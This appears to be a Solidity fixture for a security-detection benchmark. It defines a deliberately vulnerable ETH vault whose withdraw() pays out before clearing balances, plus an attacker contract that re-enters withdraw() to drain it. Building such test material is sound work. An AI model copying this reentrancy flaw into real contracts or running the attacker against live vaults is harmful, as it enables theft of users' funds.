// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SessionVault
 * @notice A benign-looking multi-user ETH vault used to generate normal
 *         traffic inside a long session. It carries the same
 *         checks-effects-interactions flaw as ReentrancyVault, so the one
 *         malicious transaction in the haystack is a genuine drain.
 *
 * Normal traffic: deposit() / withdraw() with simple share accounting.
 * Vulnerability: withdraw() sends ETH to msg.sender before zeroing the
 * caller's balance, so a contract receiver can re-enter and drain the vault.
 */
contract SessionVault {
    mapping(address => uint256) public balances;
    uint256 public totalDeposited;
    uint256 public totalWithdrawn;
    uint256 public depositCount;
    uint256 public withdrawCount;

    event Deposit(address indexed who, uint256 amount);
    event Withdrawal(address indexed who, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balances[msg.sender] += msg.value;
        totalDeposited += msg.value;
        depositCount += 1;
        emit Deposit(msg.sender, msg.value);
    }

    /// @dev VULNERABLE: the external call precedes the state update.
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");

        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
        totalWithdrawn += bal;
        withdrawCount += 1;
        emit Withdrawal(msg.sender, bal);
    }

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }
}

/**
 * @title SessionAttacker
 * @notice Re-enters SessionVault.withdraw() from its receive() hook. Used only
 *         for the one malicious transaction in the long session.
 */
contract SessionAttacker {
    SessionVault public immutable vault;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(SessionVault v) {
        vault = v;
    }

    function attack(uint256 depth) external {
        maxReentries = depth;
        reentries = 0;
        vault.deposit{value: address(this).balance}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentries < maxReentries) {
            reentries += 1;
            vault.withdraw();
        }
    }
}
